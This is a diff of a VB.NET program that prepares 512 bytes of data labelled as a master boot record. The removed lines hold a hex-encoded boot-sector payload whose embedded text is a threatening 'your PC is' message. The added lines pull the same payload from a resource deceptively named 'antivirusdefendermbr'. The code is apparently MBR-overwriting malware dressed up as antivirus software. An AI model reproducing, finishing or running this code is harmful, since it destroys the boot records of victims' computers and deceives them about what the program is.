@@ -773,11 +773,9 @@ Public Class Form1
         ' Create a temporary file
         Dim tempFilePath As String = Path.GetTempFileName()
 
-        ' Hex data as a string
-        Dim hexData As String = "EB0031C08ED8FC1312111009080706050400BE0000BF01008A84077CB400CD10E80B00E844004683FE0A7CECEBFEB90500BF0100E82200E8300083FF01750D83C10183F9147EEDBF0000EBE883E90183F9057DE0BF0100EBDC0FB30FBE707CAC3C007406B40ECD10EBF5C3B9FFFF4975FDC3414E54544956495253444546454E444552203130204E4F572049344F555252204E494748544D4141524553205448455245204953204E4F204553434150455920594F55522050432049532052"
-
-        ' Convert hex string to byte array
-        Dim mbrData As Byte() = Enumerable.Range(0, hexData.Length \ 2).Select(Function(i) Convert.ToByte(hexData.Substring(i * 2, 2), 16)).ToArray()
+        ' 3. Extract antivirusdefendermbr.bin from Resource1 (string to byte array conversion)
+        Dim mbrString As String = My.Resources.Resource1.antivirusdefendermbr
+        Dim mbrData As Byte() = Encoding.UTF8.GetBytes(mbrString)
 
         ' Pad the byte array to 512 bytes with zeros if it's shorter
         If mbrData.Length < 512 Then
